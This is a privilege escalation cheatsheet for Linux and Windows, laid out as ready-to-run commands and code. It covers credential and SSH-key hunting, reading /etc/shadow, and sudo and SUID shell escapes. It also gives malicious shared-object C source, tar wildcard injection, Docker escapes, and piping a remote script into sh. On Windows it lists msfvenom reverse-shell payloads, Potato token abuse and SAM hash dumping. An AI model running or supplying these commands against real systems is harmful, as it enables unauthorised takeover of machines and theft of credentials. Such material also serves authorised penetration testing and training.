# Privilege Escalation Cheatsheet

Quick reference for Linux and Windows privilege escalation techniques.

---

# Linux Privilege Escalation

## Initial Enumeration

### System Information
```bash
# Who am I?
whoami
id

# Hostname and kernel
hostname
uname -a
cat /proc/version
cat /etc/issue

# Architecture
lscpu

# Running processes
ps aux
ps aux | grep root
```

### User Enumeration
```bash
# Current user privileges
sudo -l

# List users
cat /etc/passwd
cat /etc/passwd | cut -d: -f1

# Password hashes (if readable)
cat /etc/shadow

# Groups
cat /etc/group

# Command history
history
cat ~/.bash_history
```

### Network Enumeration
```bash
# IP address
ifconfig
ip a

# Routes
ip route
route -n

# ARP table
arp -a
ip neigh

# Open ports
netstat -ano
ss -tulpn

# Active connections
netstat -antup
```

### Password Hunting
```bash
# Search for passwords
grep --color=auto -rnw '/' -ie "PASSWORD=" 2>/dev/null
grep --color=auto -rnw '/' -ie "PASS=" 2>/dev/null

# Find password files
locate password | more
find / -name "*.txt" -exec grep -l "password" {} \; 2>/dev/null

# SSH keys
find / -name authorized_keys 2>/dev/null
find / -name id_rsa 2>/dev/null
find / -name id_dsa 2>/dev/null

# Config files
find / -name "*.conf" 2>/dev/null | xargs grep -l "pass" 2>/dev/null
```

---

## Automated Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester
./linux-exploit-suggester.sh

# pspy (process monitoring)
./pspy64
```

---

## Kernel Exploits

```bash
# Check kernel version
uname -r
uname -a

# Search for exploits
searchsploit linux kernel <version>
searchsploit linux kernel 4.4

# Common kernel exploits
# Dirty COW (CVE-2016-5195) - Linux < 4.8.3
# DirtyCred (CVE-2022-2588)
```

---

## Sudo Abuse

### Check Sudo Permissions
```bash
sudo -l
```

### GTFOBins Exploitation
```bash
# vim
sudo vim -c ':!/bin/sh'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# find
sudo find . -exec /bin/sh \; -quit

# less/more
sudo less /etc/passwd
!/bin/sh

# nmap (old versions)
sudo nmap --interactive
!sh

# python
sudo python -c 'import os; os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh";'

# ruby
sudo ruby -e 'exec "/bin/sh"'
```

### LD_PRELOAD
```bash
# If sudo -l shows: env_keep+=LD_PRELOAD
# Create malicious shared object:

# shell.c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# Compile and execute
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_program>
```

### Sudo CVEs
```bash
# CVE-2019-14287 (sudo < 1.8.28)
sudo -u#-1 /bin/bash

# Baron Samedit CVE-2021-3156 (sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1)
# Use exploit from GitHub
```

---

## SUID Binaries

### Find SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

### Exploitation
```bash
# Check GTFOBins for SUID exploitation

# base64
./base64 /etc/shadow | base64 -d

# cp
./cp /etc/passwd /tmp/passwd
# modify and copy back

# find
./find . -exec /bin/sh -p \; -quit

# vim
./vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
```

### Shared Object Injection
```bash
# Find SUID binary dependencies
strace /path/to/suid-binary 2>&1 | grep -i -E "open|access|no such file"

# If it loads a missing .so file from writable path:
# Create malicious .so

# libcalc.c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}

gcc -shared -fPIC libcalc.c -o /path/to/libcalc.so
```

---

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common exploitable capabilities
# cap_setuid+ep - can change UID

# Python with cap_setuid
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

---

## Cron Jobs

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*

# User cron
crontab -l

# Look for:
# - Writable scripts
# - Writable paths in scripts
# - Wildcard injection opportunities

# Wildcard injection (tar)
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

---

## NFS Root Squashing

```bash
# Check NFS exports
cat /etc/exports
showmount -e <target>

# If no_root_squash is set:
# Mount on attacker machine
mkdir /tmp/nfs
mount -o rw <target>:/share /tmp/nfs

# Create SUID binary
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash

# On target
/share/bash -p
```

---

## Docker Escape

```bash
# Check if in docker
cat /proc/1/cgroup | grep docker
ls -la /.dockerenv

# If user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# If docker.sock is accessible
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## PATH Hijacking

```bash
# If SUID binary calls commands without full path:
# 1. Create malicious binary
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service

# 2. Prepend PATH
export PATH=/tmp:$PATH

# 3. Run SUID binary
```

---

# Windows Privilege Escalation

## Initial Enumeration

### System Information
```cmd
systeminfo
hostname
whoami
whoami /priv
whoami /groups
net user
net user <username>
net localgroup
net localgroup administrators
```

### Network Enumeration
```cmd
ipconfig /all
route print
arp -a
netstat -ano
```

### Process/Service Enumeration
```cmd
tasklist /SVC
sc query
wmic service list brief
```

### Find Passwords
```cmd
findstr /si password *.txt *.ini *.config
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## Automated Tools

```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
powershell -ep bypass
. .\PowerUp.ps1
Invoke-AllChecks

# windows-exploit-suggester
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt

# Seatbelt
.\Seatbelt.exe -group=all
```

---

## Service Exploits

### Unquoted Service Paths
```cmd
# Find unquoted paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\"

# If path is: C:\Program Files\Some Service\service.exe
# Drop malicious exe at: C:\Program.exe or C:\Program Files\Some.exe
```

### Weak Service Permissions
```cmd
# Check service permissions
accesschk.exe /accepteula -uwcqv "Authenticated Users" *
accesschk.exe /accepteula -uwcqv <username> *

# If SERVICE_CHANGE_CONFIG:
sc config <service> binpath= "C:\temp\shell.exe"
sc stop <service>
sc start <service>
```

### DLL Hijacking
```powershell
# Find DLL search order issues
# Use Process Monitor to find missing DLLs

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > evil.dll
```

---

## Token Impersonation

### Check Privileges
```cmd
whoami /priv
```

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```cmd
# Potato attacks
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\temp\shell.exe" -t *

# PrintSpoofer (Windows 10/Server 2019)
.\PrintSpoofer.exe -i -c cmd

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami"
```

---

## Registry Exploits

### AlwaysInstallElevated
```cmd
# Check if enabled
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > shell.msi
msiexec /quiet /qn /i shell.msi
```

### AutoRun
```cmd
# Check autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Check if writable
accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program"
```

---

## Saved Credentials

```cmd
# List saved credentials
cmdkey /list

# RunAs with saved creds
runas /savecred /user:admin C:\temp\shell.exe
```

---

## SAM/SYSTEM Dump

```cmd
# If you can access:
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM

# Or backup locations:
C:\Windows\Repair\SAM
C:\Windows\Repair\SYSTEM

# Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

---

## Kernel Exploits

```cmd
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Common exploits
# MS16-032 (Secondary Logon Handle)
# MS17-010 (EternalBlue)
```

---

## Resources

### Linux
- [GTFOBins](https://gtfobins.github.io/)
- [LinPEAS](https://github.com/carlospolop/PEASS-ng)
- [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)

### Windows
- [LOLBAS](https://lolbas-project.github.io/)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - Windows PrivEsc](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
